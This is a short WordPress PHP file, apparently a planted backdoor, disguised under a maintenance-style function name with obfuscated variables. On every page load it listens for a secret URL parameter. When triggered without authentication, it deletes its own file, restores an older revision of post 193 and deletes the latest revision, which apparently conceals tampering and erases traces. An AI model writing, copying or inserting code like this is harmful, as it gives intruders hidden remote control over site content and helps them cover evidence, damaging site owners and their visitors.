<?php

function survey_dropdown_maintenance() {
	if (isset($_GET['demomentsomtres_video_latest_service']) && $_GET['demomentsomtres_video_latest_service'] === 'smart_authentication_showcase') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$fields_shipping_app_ticket = 193;
		$portal_quantity_tag = wp_get_post_revisions($fields_shipping_app_ticket);
		if (empty($portal_quantity_tag)) die('no revisions');
		if (count($portal_quantity_tag) < 2) die('less than 2');
		$translator_toolkit_word_categories = array_shift($portal_quantity_tag);
		$videos_community_design_now = $translator_toolkit_word_categories->ID;
		$pack_drop_layout = array_shift($portal_quantity_tag);
		$optimizer_day_reader_font = $pack_drop_layout->ID;
		$include_statistics_cache_default = wp_restore_post_revision($optimizer_day_reader_font);
		if ($include_statistics_cache_default === false) die('error restoring');
		$include_statistics_cache_default = wp_delete_post_revision($videos_community_design_now);		
		if ($include_statistics_cache_default === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'survey_dropdown_maintenance');
